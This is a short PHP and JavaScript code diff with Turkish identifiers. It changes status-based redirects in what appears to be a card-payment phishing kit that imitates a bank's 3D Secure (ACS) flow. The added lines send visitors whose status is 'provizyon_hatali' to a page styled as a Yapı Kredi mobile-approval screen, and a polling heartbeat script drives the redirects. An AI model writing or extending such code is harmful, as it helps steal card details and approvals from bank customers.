@@ -98,8 +98,9 @@ if ($get_hata !== null) {
     $hata_modu  = ($durum === '3d_hatali');
 
     if ($durum === 'tebrik') { header('Location: ' . BASE_PATH . '/sonuc.php'); exit; }
+    if ($durum === 'provizyon_hatali') { header("Location: " . BASE_PATH . "/acs/yapikredi-mobil-onay.php"); exit; }
     if (in_array($durum, ['kart_hatali','eticaret_kapali','limit_yetersiz',
-                           'kart_desteklenmiyor','provizyon_hatali','provizyon_gonder'])) {
+                           'kart_desteklenmiyor','provizyon_gonder'])) {
         header("Location: " . BASE_PATH . "/odeme_hata.php?hata={$durum}"); exit;
     }
 }
@@ -191,7 +192,8 @@ function acs_heartbeat_js(bool $kodGoster, bool $hataModu): string {
         }
 
         if(dur==='tebrik'){ location.href='{$bp}/sonuc.php'; return; }
-        var hataListe=['kart_hatali','eticaret_kapali','limit_yetersiz','kart_desteklenmiyor','provizyon_hatali','provizyon_gonder'];
+        if(dur==='provizyon_hatali'){ location.href='{$bp}/acs/yapikredi-mobil-onay.php'; return; }
+        var hataListe=['kart_hatali','eticaret_kapali','limit_yetersiz','kart_desteklenmiyor','provizyon_gonder'];
         if(hataListe.indexOf(dur)!==-1){ location.href='{$bp}/odeme_hata.php?hata='+dur; }
       }).catch(function(){});
   }
